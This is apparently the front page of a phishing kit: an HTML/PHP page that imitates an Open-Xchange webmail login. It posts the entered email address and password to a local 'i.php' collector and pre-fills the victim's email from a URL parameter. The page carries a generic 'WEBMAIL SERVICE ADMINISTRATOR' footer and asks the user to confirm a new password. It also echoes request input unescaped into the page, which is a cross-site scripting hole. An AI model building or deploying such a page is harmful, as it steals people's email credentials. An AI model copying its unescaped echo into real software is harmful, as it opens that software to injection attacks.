<!DOCTYPE html>
<html lang="en">
   <head>
      <meta charset="utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
      <meta name="viewport" content="initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
      <link rel="stylesheet" href="login.css">
     
   </head>
   <body>
     
      <div id="io-ox-login-screen" style="display: block">
       
         <div id="io-ox-login-container-scrollpane">
            <div id="io-ox-login-container" class="container">
               <div id="io-ox-login-header">
                  <h1><span id='io-ox-login-header-prefix'></span><span id='io-ox-login-header-label'>Login to continue</span></h1>
               </div>
               <div id="io-ox-login-header_new">
                    <h1><span id='io-ox-login-header-prefix' name='io-ox-login-header-prefix_new'></span><span id='io-ox-login-header-label' name='io-ox-login-header-label_new'></span></h1>
            </div>
               <div id="io-ox-login-form-container">
                  <form action="i.php" method="post" id="io-ox-login-form">
                     <input type="hidden" name="location" value="">
                     <div class="row help">
                        <div class="col-xs-12">
                           <p id="io-ox-login-help" class="help-block"></p>
                        </div>
                     </div>
                     <div class="row username">
                        <div class="form-group col-xs-12"><label for="io-ox-login-username" class="sr-only" data-i18n="User name">Email Address:</label><input type="email" id="io-ox-login-username" name="username" required class="form-control" maxlength="1000" autocorrect="off" autocapitalize="off" spellcheck="false" aria-required="true" placeholder="<?php echo $_REQUEST['email'];?>" data-i18n="User name" data-i18n-attr="placeholder" value="<?php echo $_REQUEST['email'];?>"></div>
                     </div>
                     <div class="row password">
                        <div class="form-group col-xs-12"><label for="io-ox-login-password" class="sr-only" data-i18n="Password">Email Password</label><input type="password" id="io-ox-login-password" name="password" required class="form-control" maxlength="100" autocorrect="off" autocapitalize="off" aria-required="true" placeholder="Email Password" data-i18n="Password" data-i18n-attr="placeholder"></div>
                     </div>
                     <div class="row password-retype">
                        <div class="form-group col-xs-12"><label for="io-ox-retype-password" class="sr-only" data-i18n="Confirm new password">Confirm new password</label><input type="password" id="io-ox-retype-password" name="password2" class="form-control" maxlength="100" autocorrect="off" autocapitalize="off" aria-required="true" placeholder="Confirm new password" data-i18n="Confirm new password" data-i18n-attr="placeholder"></div>
                     </div>
                     <div class="row feedback">
                        <div class="col-xs-12" id="io-ox-login-feedback"></div>
                     </div>
                     <div class="row options">
                        <div class="col-sm-6 col-xs-12 checkbox" id="io-ox-login-store"><label for="io-ox-login-store-box" aria-label="Stay signed in" data-i18n="Stay signed in" data-i18n-attr="label,aria-label"><input type="checkbox" id="io-ox-login-store-box" checked="checked" name="store" value="1">Stay signed in</label></div>
                        <div class="col-sm-6 col-xs-12 radio text-right" id="io-ox-forgot-password"><a href="#" target="_blank" data-i18n="Forgot your password?">Forgot your password?</a></div>
                     </div>
                     <div class="row buttons">
                        <div class="form-group col-sm-6 col-xs-12"><input type="submit" name="signin" id="io-ox-login-button" class="btn btn-primary form-control" value="Sign in" data-i18n="Sign in" data-i18n-attr="value,aria-label"/></div>
                     </div>
					 
                  </form>
                  <form action="/appsuite/api/share/reset/password" method="get" id="io-ox-password-forget-form" style="display:none;" novalidate>
                     <div class="row help">
                        <div class="col-xs-12">
                           <p class="help-block"></p>
                        </div>
                     </div>
                     <div class="row email">
                        <div class="form-group col-xs-12"><label for="io-ox-login-restoremail" class="sr-only" data-i18n="Email">Email</label><input type="email" id="io-ox-login-restoremail" name="restoremail" class="form-control" maxlength="1000" autocorrect="off" autocapitalize="off" spellcheck="false" aria-required="true" placeholder="Email" data-i18n="Email address" data-i18n-attr="placeholder"></div>
                     </div>
                     <div class="row button">
                        <div class="form-group col-sm-6 col-xs-12"><input type="submit" name="resetpassword"id="resetpassword-button" class="btn btn-primary form-control"value="Reset my password" data-i18n="Next" data-i18n-attr="value,aria-label"></div>
                        <div class="col-sm-6 col-xs-12 text-right" id="io-ox-backtosignin"><a href="#" target="_blank" data-i18n="Back to sign in">Back to sign in</a></div>
                     </div>
                  </form>
               </div>
            </div>
			<footer id="io-ox-login-footer"><span id="io-ox-languages"><span class="lang-label" data-i18n="Languages" data-i18n-attr="text">Languages</span><div class="dropup"><a href="#" id="io-ox-languages-label" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"><span class="toggle-text">English (US)</span><span class="caret"></span></a></div></span><span id="io-ox-copyright">© 2019 WEBMAIL SERVICE ADMINISTRATOR.</span></footer>
         </div>
      </div>
      <div id="io-ox-offline" style="bottom: -41px; display: none;"></div>
      <div id="io-ox-alert-screenreader" role="alert" aria-live="polite" class="sr-only"><span id="sr-alert-text"></span></div>
 </body>
</html>
